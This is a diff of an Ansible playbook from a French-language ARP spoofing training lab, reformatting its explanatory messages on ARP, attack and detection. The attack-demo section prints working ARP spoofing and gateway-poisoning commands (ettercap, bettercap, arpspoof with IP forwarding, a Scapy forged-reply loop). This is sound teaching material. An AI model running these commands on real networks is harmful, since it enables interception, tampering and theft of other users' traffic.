@@ -42,22 +42,22 @@
       script: ../scripts/cisco_cli.py --host {{ gns3_host }} --port {{ sw1_console_port }} --show "show mac address-table"
       when: exercise == "view_arp"
 
-    - name: "VIEW_ARP: Résumé"
+    - name: "VIEW_ARP: Resume"
       debug:
-        msg: |
-          ========================================
-          TABLES ARP ET MAC
-          ========================================
-
-          La table ARP associe une IP à une MAC (Layer 3 ↔ Layer 2)
-          La table MAC associe une MAC à un port physique
-
-          Commandes utiles:
-            show ip arp                    # Table ARP
-            show mac address-table         # Table MAC
-            clear ip arp                   # Vider le cache ARP
-
-          ========================================
+        msg:
+          - "========================================"
+          - "TABLES ARP ET MAC"
+          - "========================================"
+          - ""
+          - "La table ARP associe une IP a une MAC (Layer 3 <-> Layer 2)"
+          - "La table MAC associe une MAC a un port physique"
+          - ""
+          - "Commandes utiles:"
+          - "  show ip arp                    # Table ARP"
+          - "  show mac address-table         # Table MAC"
+          - "  clear ip arp                   # Vider le cache ARP"
+          - ""
+          - "========================================"
       when: exercise == "view_arp"
 
     # =========================================================================
@@ -65,42 +65,42 @@
     # =========================================================================
     - name: "ARP_PROCESS: Explication du processus"
       debug:
-        msg: |
-          ========================================
-          PROCESSUS ARP (Address Resolution Protocol)
-          ========================================
-
-          SCÉNARIO: ALICE (192.168.10.10) veut communiquer avec BOB (192.168.10.20)
-
-          1. ALICE vérifie son cache ARP
-             → MAC de 192.168.10.20 inconnue
-
-          2. ALICE envoie un ARP REQUEST (broadcast)
-             Source MAC: AA:AA:AA:AA:AA:AA (ALICE)
-             Dest MAC:   FF:FF:FF:FF:FF:FF (broadcast)
-             "Who has 192.168.10.20? Tell 192.168.10.10"
-
-          3. Le SWITCH flood la requête sur tous les ports du VLAN
-
-          4. BOB reconnaît son IP et répond (unicast)
-             Source MAC: BB:BB:BB:BB:BB:BB (BOB)
-             Dest MAC:   AA:AA:AA:AA:AA:AA (ALICE)
-             "192.168.10.20 is at BB:BB:BB:BB:BB:BB"
-
-          5. ALICE met à jour son cache ARP
-             192.168.10.20 → BB:BB:BB:BB:BB:BB
-
-          6. Communication possible en Layer 2!
-
-          ========================================
-          VULNÉRABILITÉ
-          ========================================
-
-          - ARP n'a AUCUNE authentification
-          - Tout le monde peut envoyer des réponses ARP
-          - Les hôtes acceptent les réponses même sans requête (Gratuitous ARP)
-
-          ========================================
+        msg:
+          - "========================================"
+          - "PROCESSUS ARP (Address Resolution Protocol)"
+          - "========================================"
+          - ""
+          - "SCENARIO: ALICE (192.168.10.10) veut communiquer avec BOB (192.168.10.20)"
+          - ""
+          - "1. ALICE verifie son cache ARP"
+          - "   -> MAC de 192.168.10.20 inconnue"
+          - ""
+          - "2. ALICE envoie un ARP REQUEST (broadcast)"
+          - "   Source MAC: AA:AA:AA:AA:AA:AA (ALICE)"
+          - "   Dest MAC:   FF:FF:FF:FF:FF:FF (broadcast)"
+          - "   \"Who has 192.168.10.20? Tell 192.168.10.10\""
+          - ""
+          - "3. Le SWITCH flood la requete sur tous les ports du VLAN"
+          - ""
+          - "4. BOB reconnait son IP et repond (unicast)"
+          - "   Source MAC: BB:BB:BB:BB:BB:BB (BOB)"
+          - "   Dest MAC:   AA:AA:AA:AA:AA:AA (ALICE)"
+          - "   \"192.168.10.20 is at BB:BB:BB:BB:BB:BB\""
+          - ""
+          - "5. ALICE met a jour son cache ARP"
+          - "   192.168.10.20 -> BB:BB:BB:BB:BB:BB"
+          - ""
+          - "6. Communication possible en Layer 2!"
+          - ""
+          - "========================================"
+          - "VULNERABILITE"
+          - "========================================"
+          - ""
+          - "- ARP n'a AUCUNE authentification"
+          - "- Tout le monde peut envoyer des reponses ARP"
+          - "- Les hotes acceptent les reponses meme sans requete (Gratuitous ARP)"
+          - ""
+          - "========================================"
       when: exercise == "arp_process"
 
     - name: "ARP_PROCESS: Générer du trafic ARP"
@@ -116,130 +116,130 @@
     # =========================================================================
     - name: "ATTACK_DEMO: Explication de l'attaque"
       debug:
-        msg: |
-          ========================================
-          ARP SPOOFING / MAN-IN-THE-MIDDLE
-          ========================================
-
-          OBJECTIF DE L'ATTAQUANT:
-            Intercepter le trafic entre ALICE et BOB
-
-          MÉTHODE:
-            1. L'attaquant envoie de faux ARP Reply:
-               - À ALICE: "192.168.10.20 (BOB) is at ATTACKER_MAC"
-               - À BOB:   "192.168.10.10 (ALICE) is at ATTACKER_MAC"
-
-            2. ALICE et BOB mettent à jour leur cache ARP
-
-            3. Tout le trafic passe par l'ATTACKER:
-               ALICE → ATTACKER → BOB
-               BOB → ATTACKER → ALICE
-
-            4. L'attaquant peut:
-               - Sniffer le trafic (mots de passe, données)
-               - Modifier le trafic (injection)
-               - Bloquer le trafic (DoS)
-
-          ========================================
-          OUTILS D'ATTAQUE (sur Kali Linux)
-          ========================================
-
-          # ETTERCAP - MitM classique
-          ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//
-
-          # BETTERCAP - Framework moderne
-          sudo bettercap -iface eth0
-          > net.probe on
-          > set arp.spoof.targets 192.168.10.10,192.168.10.20
-          > arp.spoof on
-
-          # ARPSPOOF (dsniff) - Simple et efficace
-          echo 1 > /proc/sys/net/ipv4/ip_forward
-          arpspoof -i eth0 -t 192.168.10.10 -r 192.168.10.20
-
-          # SCAPY (Python) - Crafting manuel
-          from scapy.all import *
-          # Forge un ARP reply
-          arp = ARP(op=2, psrc="192.168.10.20", hwsrc="AA:BB:CC:DD:EE:FF",
-                    pdst="192.168.10.10", hwdst="target_mac")
-          send(arp, loop=1, inter=2)
-
-          ========================================
-          GATEWAY POISONING
-          ========================================
-
-          Pour intercepter TOUT le trafic sortant:
-            - Spoofer l'IP de la gateway (192.168.10.254)
-            - Tout le monde envoie son trafic à l'attaquant
-
-          arpspoof -i eth0 -t 192.168.10.10 192.168.10.254
-          arpspoof -i eth0 -t 192.168.10.254 192.168.10.10
-
-          ========================================
+        msg:
+          - "========================================"
+          - "ARP SPOOFING / MAN-IN-THE-MIDDLE"
+          - "========================================"
+          - ""
+          - "OBJECTIF DE L'ATTAQUANT:"
+          - "  Intercepter le trafic entre ALICE et BOB"
+          - ""
+          - "METHODE:"
+          - "  1. L'attaquant envoie de faux ARP Reply:"
+          - "     - A ALICE: \"192.168.10.20 (BOB) is at ATTACKER_MAC\""
+          - "     - A BOB:   \"192.168.10.10 (ALICE) is at ATTACKER_MAC\""
+          - ""
+          - "  2. ALICE et BOB mettent a jour leur cache ARP"
+          - ""
+          - "  3. Tout le trafic passe par l'ATTACKER:"
+          - "     ALICE -> ATTACKER -> BOB"
+          - "     BOB -> ATTACKER -> ALICE"
+          - ""
+          - "  4. L'attaquant peut:"
+          - "     - Sniffer le trafic (mots de passe, donnees)"
+          - "     - Modifier le trafic (injection)"
+          - "     - Bloquer le trafic (DoS)"
+          - ""
+          - "========================================"
+          - "OUTILS D'ATTAQUE (sur Kali Linux)"
+          - "========================================"
+          - ""
+          - "# ETTERCAP - MitM classique"
+          - "ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//"
+          - ""
+          - "# BETTERCAP - Framework moderne"
+          - "sudo bettercap -iface eth0"
+          - "> net.probe on"
+          - "> set arp.spoof.targets 192.168.10.10,192.168.10.20"
+          - "> arp.spoof on"
+          - ""
+          - "# ARPSPOOF (dsniff) - Simple et efficace"
+          - "echo 1 > /proc/sys/net/ipv4/ip_forward"
+          - "arpspoof -i eth0 -t 192.168.10.10 -r 192.168.10.20"
+          - ""
+          - "# SCAPY (Python) - Crafting manuel"
+          - "from scapy.all import *"
+          - "# Forge un ARP reply"
+          - "arp = ARP(op=2, psrc=\"192.168.10.20\", hwsrc=\"AA:BB:CC:DD:EE:FF\","
+          - "          pdst=\"192.168.10.10\", hwdst=\"target_mac\")"
+          - "send(arp, loop=1, inter=2)"
+          - ""
+          - "========================================"
+          - "GATEWAY POISONING"
+          - "========================================"
+          - ""
+          - "Pour intercepter TOUT le trafic sortant:"
+          - "  - Spoofer l'IP de la gateway (192.168.10.254)"
+          - "  - Tout le monde envoie son trafic a l'attaquant"
+          - ""
+          - "arpspoof -i eth0 -t 192.168.10.10 192.168.10.254"
+          - "arpspoof -i eth0 -t 192.168.10.254 192.168.10.10"
+          - ""
+          - "========================================"
       when: exercise == "attack_demo"
 
     # =========================================================================
     # Exercice: Détecter une anomalie ARP
     # =========================================================================
-    - name: "DETECT_SPOOF: Méthodes de détection"
+    - name: "DETECT_SPOOF: Methodes de detection"
       debug:
-        msg: |
-          ========================================
-          DÉTECTION DU ARP SPOOFING
-          ========================================
-
-          1. SURVEILLANCE DES TABLES ARP
-          ========================================
-
-          Symptômes suspects:
-            - Même MAC pour plusieurs IPs
-            - Changements fréquents de MAC pour une IP
-            - MAC broadcast/multicast pour une IP unicast
-
-          Commandes de diagnostic:
-            show ip arp                 # Chercher les doublons
-            show mac address-table      # Vérifier les associations
-
-          ========================================
-          2. ARPWATCH (Linux)
-          ========================================
-
-          Installation:
-            sudo apt install arpwatch
-
-          Démarrage:
-            sudo arpwatch -i eth0
-
-          Logs:
-            tail -f /var/log/syslog | grep arpwatch
-
-          Alertes générées:
-            - "flip flop" = MAC change pour une IP
-            - "changed ethernet address" = Nouvelle MAC
-            - "new station" = Nouveau host détecté
-
-          ========================================
-          3. WIRESHARK
-          ========================================
-
-          Filtres utiles:
-            arp                           # Tout le trafic ARP
-            arp.duplicate-address-detected # Doublons
-            arp.src.proto_ipv4 == arp.dst.proto_ipv4  # Gratuitous ARP
-
-          Statistiques:
-            Statistics → Resolved Addresses → Chercher les conflits
-
-          ========================================
-          4. NMAP
-          ========================================
-
-          Scan ARP du réseau:
-            nmap -sn -PR 192.168.10.0/24
-
-          Comparer avec les tables connues.
-
-          ========================================
+        msg:
+          - "========================================"
+          - "DETECTION DU ARP SPOOFING"
+          - "========================================"
+          - ""
+          - "1. SURVEILLANCE DES TABLES ARP"
+          - "========================================"
+          - ""
+          - "Symptomes suspects:"
+          - "  - Meme MAC pour plusieurs IPs"
+          - "  - Changements frequents de MAC pour une IP"
+          - "  - MAC broadcast/multicast pour une IP unicast"
+          - ""
+          - "Commandes de diagnostic:"
+          - "  show ip arp                 # Chercher les doublons"
+          - "  show mac address-table      # Verifier les associations"
+          - ""
+          - "========================================"
+          - "2. ARPWATCH (Linux)"
+          - "========================================"
+          - ""
+          - "Installation:"
+          - "  sudo apt install arpwatch"
+          - ""
+          - "Demarrage:"
+          - "  sudo arpwatch -i eth0"
+          - ""
+          - "Logs:"
+          - "  tail -f /var/log/syslog | grep arpwatch"
+          - ""
+          - "Alertes generees:"
+          - "  - \"flip flop\" = MAC change pour une IP"
+          - "  - \"changed ethernet address\" = Nouvelle MAC"
+          - "  - \"new station\" = Nouveau host detecte"
+          - ""
+          - "========================================"
+          - "3. WIRESHARK"
+          - "========================================"
+          - ""
+          - "Filtres utiles:"
+          - "  arp                           # Tout le trafic ARP"
+          - "  arp.duplicate-address-detected # Doublons"
+          - "  arp.src.proto_ipv4 == arp.dst.proto_ipv4  # Gratuitous ARP"
+          - ""
+          - "Statistiques:"
+          - "  Statistics -> Resolved Addresses -> Chercher les conflits"
+          - ""
+          - "========================================"
+          - "4. NMAP"
+          - "========================================"
+          - ""
+          - "Scan ARP du reseau:"
+          - "  nmap -sn -PR 192.168.10.0/24"
+          - ""
+          - "Comparer avec les tables connues."
+          - ""
+          - "========================================"
       when: exercise == "detect_spoof"
 
     - name: "DETECT_SPOOF: Vérifier les tables actuelles"
@@ -250,20 +250,20 @@
       script: ../scripts/cisco_cli.py --host {{ gns3_host }} --port {{ sw1_console_port }} --show "show mac address-table"
       when: exercise == "detect_spoof"
 
-    - name: Résumé
+    - name: Resume
       debug:
-        msg: |
-          ========================================
-          LAB ARP SPOOFING - RÉSUMÉ
-          ========================================
-
-          Exercices disponibles:
-            -e "exercise=view_arp"      # Tables ARP/MAC
-            -e "exercise=arp_process"   # Processus ARP
-            -e "exercise=attack_demo"   # Démonstration attaque
-            -e "exercise=detect_spoof"  # Détection
-
-          Prochaine étape - Mitigation:
-            ansible-playbook playbooks/06_mitigation.yml
-
-          ========================================
+        msg:
+          - "========================================"
+          - "LAB ARP SPOOFING - RESUME"
+          - "========================================"
+          - ""
+          - "Exercices disponibles:"
+          - "  -e \"exercise=view_arp\"      # Tables ARP/MAC"
+          - "  -e \"exercise=arp_process\"   # Processus ARP"
+          - "  -e \"exercise=attack_demo\"   # Demonstration attaque"
+          - "  -e \"exercise=detect_spoof\"  # Detection"
+          - ""
+          - "Prochaine etape - Mitigation:"
+          - "  ansible-playbook playbooks/06_mitigation.yml"
+          - ""
+          - "========================================"
